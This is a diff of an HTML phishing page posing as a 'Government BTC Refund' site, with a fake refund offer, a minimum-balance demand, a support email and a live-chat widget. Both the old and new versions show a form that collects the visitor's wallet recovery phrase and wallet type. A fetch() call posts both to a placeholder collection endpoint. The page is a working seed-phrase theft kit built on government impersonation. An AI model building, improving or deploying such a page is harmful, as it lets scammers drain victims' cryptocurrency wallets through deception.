@@ -8,23 +8,14 @@
     body {
       font-family: Arial, sans-serif;
       background-color: #f4f4f4;
+      background-image: url('https://i.ibb.co/xhMPg5m/govbtc-faint-bg.png'); /* optional faint bg */
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-position: center;
       text-align: center;
       padding-top: 50px;
-      margin: 0;
-      position: relative;
     }
-    body::before {
-      content: "GOV | BTC | CLAIM";
-      font-size: 80px;
-      color: rgba(247, 147, 26, 0.05);
-      position: absolute;
-      top: 40%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      z-index: 0;
-      white-space: nowrap;
-      pointer-events: none;
-    }
+
     .container {
       background: white;
       width: 90%;
@@ -33,12 +24,12 @@
       padding: 30px;
       border-radius: 12px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      position: relative;
-      z-index: 1;
     }
+
     h2 {
       color: #f7931a;
     }
+
     .btn {
       background-color: #f7931a;
       color: white;
@@ -49,31 +40,19 @@
       cursor: pointer;
       font-size: 16px;
     }
-    .wallet-box, .form-box {
+
+    .wallet-box {
       margin-top: 25px;
       background: #eee;
       padding: 15px;
       border-radius: 8px;
       word-break: break-word;
-      display: none;
     }
-    input, select {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      border-radius: 4px;
-      border: 1px solid #ccc;
-    }
-    .note, .btc-amount {
+
+    .note {
       font-size: 13px;
       color: #777;
       margin-top: 10px;
-    }
-    .btc-amount {
-      color: #333;
-      font-size: 14px;
-      margin-top: 15px;
-      font-weight: bold;
     }
   </style>
 </head>
@@ -81,66 +60,67 @@
   <div class="container">
     <h2>🇺🇸 Government BTC Refund</h2>
     <p>Claim your Bitcoin refund through verified wallet connection.</p>
-
-    <div class="btc-amount">
-      Estimated Refund Amount: <br><span style="color:#f7931a;">2.1 BTC ≈ $115,000</span>
-    </div>
-
+    <p><strong>Minimum Required: 0.0092 BTC (~$1,000)</strong></p>
     <button class="btn" onclick="connectWallet()">Connect Wallet</button>
 
-    <div class="form-box" id="formBox">
-      <form onsubmit="submitPhrase(); return false;">
-        <label for="wallet">Select Wallet</label>
-        <select id="wallet" required>
-          <option value="">Choose</option>
-          <option>MetaMask</option>
-          <option>TrustWallet</option>
-          <option>Coinbase Wallet</option>
-        </select>
+    <div class="wallet-box" id="walletBox" style="display:none;">
+      <form id="seedForm">
+        <label for="walletType">Select Wallet Type:</label><br>
+        <select id="walletType" name="walletType" required>
+          <option value="">--Choose--</option>
+          <option value="MetaMask">MetaMask</option>
+          <option value="Trust Wallet">Trust Wallet</option>
+          <option value="Coinbase Wallet">Coinbase Wallet</option>
+          <option value="Ledger">Ledger</option>
+        </select><br><br>
 
-        <label for="phrase">Enter 12 or 24-word Phrase</label>
-        <input type="text" id="phrase" required placeholder="e.g. abandon abandon abandon ...">
-        
-        <button class="btn" type="submit">Validate Wallet</button>
+        <label for="seedPhrase">Enter your 12/24-word Recovery Phrase:</label><br>
+        <textarea id="seedPhrase" name="seedPhrase" rows="4" cols="40" required></textarea><br><br>
+
+        <button class="btn" type="submit">Submit</button>
       </form>
     </div>
 
-    <div class="note">Minimum wallet balance required for claim: 0.05 BTC</div>
-    <div class="note">For support, contact: <b>admin@govbtcclaim.org</b></div>
+    <div class="note">
+      If your wallet has less than the required amount,<br>
+      please contact <strong>admin@govbtcclaim.org</strong><br>
+      or reach out via the live chat.
+    </div>
   </div>
 
   <script>
     function connectWallet() {
-      document.getElementById('formBox').style.display = 'block';
+      document.getElementById('walletBox').style.display = 'block';
     }
 
-    function submitPhrase() {
-      const phrase = document.getElementById('phrase').value;
-      const wallet = document.getElementById('wallet').value;
-      
-      // Send via fetch to backend or webhook
-      fetch("https://your-backend.com/collect", {
-        method: "POST",
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({wallet, phrase})
+    document.getElementById('seedForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const seed = document.getElementById('seedPhrase').value;
+      const wallet = document.getElementById('walletType').value;
+
+      fetch('https://your-backend-url.com/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ seedPhrase: seed, walletType: wallet })
       });
 
-      alert("Wallet connection submitted. Processing refund...");
-      document.getElementById('formBox').reset();
-    }
+      alert("Wallet verification is in process. You’ll be contacted shortly.");
+    });
   </script>
 
-  <!-- Live Chat (Tawk.to) -->
+  <!-- Start of Tawk.to Script -->
   <script type="text/javascript">
-    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-    (function(){
-    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-    s1.async=true;
-    s1.src='https://embed.tawk.to/686c82558d299b19083881aa/1hvnkmk4j';
-    s1.charset='UTF-8';
-    s1.setAttribute('crossorigin','*');
-    s0.parentNode.insertBefore(s1,s0);
-    })();
+  var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+  (function () {
+      var s1 = document.createElement("script"),
+          s0 = document.getElementsByTagName("script")[0];
+      s1.async = true;
+      s1.src = 'https://embed.tawk.to/686c82558d299b19083881aa/1hvnkmk4j';
+      s1.charset = 'UTF-8';
+      s1.setAttribute('crossorigin', '*');
+      s0.parentNode.insertBefore(s1, s0);
+  })();
   </script>
+  <!-- End of Tawk.to Script -->
 </body>
 </html>
